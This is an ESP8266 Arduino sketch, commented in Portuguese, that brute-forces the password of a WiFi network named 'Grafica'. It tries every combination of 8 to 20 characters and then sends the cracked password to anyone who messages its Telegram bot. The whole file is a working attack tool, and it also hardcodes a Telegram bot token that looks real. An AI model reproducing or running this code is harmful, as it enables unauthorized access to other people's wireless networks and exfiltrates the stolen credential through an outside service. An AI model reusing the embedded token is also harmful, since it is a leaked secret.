#include <UniversalTelegramBot.h>
#include <ESP8266WiFi.h>
#include <WiFiClientSecure.h>

// Configurações do Wifi
#define WIFI_AP "Grafica"
String WIFI_PASSWORD;

#define BOT_TOKEN "1339424001:AAF62CsN7KidCcyhr48alknKpUUQx1VJBWI"  // sua chave Token Bot Telegram
// Para obter o Chat ID, acesse Telegram => usuario IDBot => comando /getid


// Instancia objeto wifiClient
WiFiClient wifiClient;

// cliente SSL necessario para a Biblioteca
WiFiClientSecure client;
UniversalTelegramBot bot(BOT_TOKEN, client);

#define R1 D1    // GPIO_14 
int Bot_mtbs = 1000; //mean time between scan messages
long Bot_lasttime;   //last time messages' scan has been done

// Status de conexão Wifi
int status = WL_IDLE_STATUS;
// Variável para controle do
// intervalo de tempo
unsigned long last_time;

bool teste = false, pronto = false;
char senha[20];
int tam = 8, j, cont, aux[20];
char caracteres[80] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', ',', '?', '`', '!', '/', '(', ')', '&', ':', ';', '=', '-', '_', '"', '$', '@', ' '};


void Charec(int posicao, int valor) {
  if (posicao != 0) {
    if (valor == 79) {
      Charec((posicao - 1), aux[posicao - 1]);
      senha[posicao] = caracteres[0];
      aux[posicao] = 0;
    }
    else {
      ++valor;
      senha[posicao] = caracteres[valor];
      aux[posicao] = valor;
      // Serial.println(senha);
    }

  } else {
    ++valor;
    senha[posicao] = caracteres[valor];
    aux[posicao] = valor;
  }
}

bool Cheio() {
  int cheio = 0;
  for (int i = 0; i < tam; i++) {
    if (aux[i] == 79) {
      cheio++;
    }
  }
  if (cheio == tam) {
    return false;
  }

  return true;
}

bool DescobreSenha() {

  while (true) {

    for (int i = 0; i < tam; i++) {
      senha[i] = caracteres[0];
      aux[i] = 0;
    }

    while (Cheio()) {
      Charec((tam - 1), aux[tam - 1]);

      String vai;

      for (int k = 0; k < tam; k++)
        vai = vai + (String)senha[k];
        
      WIFI_PASSWORD = vai;

      
      InitWiFi();

      if (teste) {
        return true;
      }
    }

    if (tam >= 20)
      return false;

    tam++;
  }
}


// Inicia conexão Wifi
void InitWiFi() {
  cont = 0;
  Serial.print("Conectando-se ao AP ...");
  // Inicia conexão com Wifi

  WiFi.begin(WIFI_AP, WIFI_PASSWORD);
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
    digitalWrite(LED_BUILTIN, LOW);
    delay(100);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(100);

    cont++;

    if (cont == 15 && WiFi.status() != WL_CONNECTED) {
      Serial.println(" Conexão Wifi falha com " + WIFI_PASSWORD);
      break;
    }
  }
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println(" Conexão Wifi estabelecida");
    teste = true;
  }
}


void MSG() {
  int numNewMessages = bot.getUpdates(bot.last_message_received + 1);
  for (int i = 0; i < numNewMessages; i++) {

    String chat_id = String(bot.messages[i].chat_id);

    bot.sendMessage(chat_id, (String)senha, "");
  }
}


void setup() {
  Serial.begin(115200);
  delay(2000);
  Serial.println("INICIANDO");


  pinMode(D1, OUTPUT);
  pronto = DescobreSenha();

  if (pronto) {
    client.setFingerprint("F2:AD:29:9C:34:48:DD:8D:F4:CF:52:32:F6:57:33:68:2E:81:C1:90");
    while (!client.connect("api.telegram.org", 443))
    {
      digitalWrite(LED_BUILTIN, LOW);
      delay(200);
      digitalWrite(LED_BUILTIN, HIGH);
      delay(200);
    }
  }
}

void loop() {

  if (pronto) {
    MSG();
    Serial.println(senha);
    digitalWrite(D1, HIGH);
  }
  delay(10000);
}
